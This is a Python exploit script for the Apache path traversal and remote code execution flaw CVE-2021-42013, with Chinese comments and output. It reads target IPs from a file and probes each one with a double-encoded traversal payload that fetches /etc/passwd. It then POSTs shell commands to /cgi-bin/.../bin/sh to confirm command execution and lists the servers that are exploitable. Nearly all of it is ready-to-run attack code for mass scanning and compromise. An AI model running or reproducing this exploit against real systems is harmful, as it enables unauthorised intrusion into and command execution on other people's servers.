# Zapache 远程代码执行 （CVE-2021-42013）
import urllib.request
import requests
import ssl


def poc(url):
    plugin_list = [
        '/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd',
    ]
    headers = {"User-Agent": "Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1"}
    for plugin_path in plugin_list:
        paylaod = url + plugin_path
        re = urllib.request.Request(url=paylaod, headers=headers)
        res = urllib.request.urlopen(re, timeout=5)
        code = res.getcode()
        context = res.read()

        if "root:x" in context.decode('utf-8') and code == 200:
            print("发现漏洞存在：")
            print("--payload--")
            print("request line：{}".format(paylaod))
            print("回显：\n" + context.decode('utf-8')[:32])
            p_ip.append(url)


def exp(url):
    plugin_list = [
        '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh',
    ]
    headers = {"User-Agent": "Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1"}
    for plugin_path in plugin_list:
        paylaod = url + plugin_path
        data = bytes('echo Content-Type: text/plain; echo;id'.encode('utf-8'))
        re = urllib.request.Request(url=paylaod, headers=headers, data=data)
        res = urllib.request.urlopen(re, timeout=5)
        code = res.getcode()
        context = res.read()

        if "uid" in context.decode('utf-8') and code == 200:
            print("发现漏洞存在：")
            print("--payload--")
            print("request line：{}".format(paylaod))
            print("request body：echo Content-Type: text/plain; echo;id")
            print("回显：\n" + context.decode('utf-8'))
            e_ip.append(url)


if __name__ == '__main__':
    ssl._create_default_https_context = ssl._create_unverified_context
    global p_ip
    p_ip = []
    e_ip = []
    with open("ip.txt", "r", encoding="utf-8") as f:
        iplib = f.readlines()
    i = 0
    print('使用poc检测中......')
    for ip in iplib:
        i += 1
        try:
            url = "http://{}".format(ip.replace("\n", ""))
            print("正在检测第{}个目标[http]:".format(i))
            print(url)
            poc(url)
        except Exception as e:
            print('目标未发现漏洞')
            print(e)
        try:
            print("正在检测第{}个目标[https]:".format(i))
            url = "https://{}".format(ip.replace("\n", ""))
            print(url)
            poc(url)
        except Exception as e:
            print('目标未发现漏洞\n')

    v_list = list(set(p_ip))
    print("-" * 30)
    print("-" * 30)
    print('使用exp检测中......')
    n = 0
    for v in v_list:
        n += 1
        try:
            print("正在检测第{}个目标[http]:".format(n))
            print(v)
            exp(v)
        except Exception as e:
            print('目标未发现漏洞\n')
    print("==检测结果==")
    print("存在漏洞的IP如下：")
    for v in v_list:
        print(v)
    print("存在RCE的IP如下：")
    e_list = list(set(e_ip))
    for e in e_list:
        print(e)
